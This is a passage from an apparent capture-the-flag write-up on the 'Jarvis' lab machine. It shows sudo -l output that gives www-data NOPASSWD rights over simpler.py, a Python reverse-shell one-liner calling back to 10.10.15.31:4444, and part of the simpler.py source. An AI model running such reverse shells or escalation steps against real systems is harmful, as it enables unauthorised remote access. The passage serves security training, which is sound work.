&lt;span class="code-line"&gt;lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&amp;gt; /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web&lt;/span&gt;
&lt;span class="code-line"&gt;-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;os-shell&amp;gt; sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;command standard output:&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for www-data on jarvis:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User www-data may run the following commands on jarvis:&lt;/span&gt;
&lt;span class="code-line"&gt;    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In oder to have a better shell, we use a python reverseshell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;export RHOST=&amp;quot;10.10.15.31&amp;quot;;export RPORT=4444;python -c &amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&amp;quot;RHOST&amp;quot;),int(os.getenv(&amp;quot;RPORT&amp;quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for www-data on jarvis:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass,&lt;/span&gt;
&lt;span class="code-line"&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User www-data may run the following commands on jarvis:&lt;/span&gt;
&lt;span class="code-line"&gt;    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py&lt;/span&gt;
&lt;span class="code-line"&gt;$ sudo -u pepper /var/www/Admin-Utilities/simpler.py&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code&gt;simpler.py&lt;/code&gt; script is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;listdir&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show_help&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;********************************************************&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;* Simpler   -   A simple simplifier ;)                 *&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;* Version 1.0                                          *&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;********************************************************&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;Usage:  python3 simpler.py [options]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;Options:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;    -h/--help   : This help&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;    -s          : Statistics&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;    -l          : List the attackers IP&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;    -p          : ping an attacker IP&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show_header&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&amp;#39;***********************************************&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;    _                 _&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;/ __| | &amp;#39;_ ` _ \| &amp;#39;_ \| |/ _ \ &amp;#39;__| &amp;#39;_ \| | | |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;                |_|               |_|    |___/&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;                                @ironhackers.es&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;***********************************************&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show_statistics&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/home/pepper/Web/Logs/&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Statistics&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;-----------&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;listed_files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;listed_files&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Number of Attackers: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;level_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;dat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;ip_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;reks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;rek&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;listed_files&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;lines&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;level2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rek&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_max_level&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;fecha&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;requ&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;date_to_num&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;fecha&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;dat&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;dat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fecha&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requ&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;ip2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;level2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;level_1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;level_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;level2&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;ip_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;reks&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rek&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;level2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;level_1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;ip_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;reks&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rek&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Most Risky:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;More than 1 ip found&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cont&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;ip_list&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;    &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; - Attack Level : &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;level_1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; Request: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;reks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;cont&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cont&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cont&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Most Recent: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; --&amp;gt; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dat&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;list_ip&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Attackers&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;-----------&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/home/pepper/Web/Logs/&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;listed_files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;listed_files&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;lines&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_max_level&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
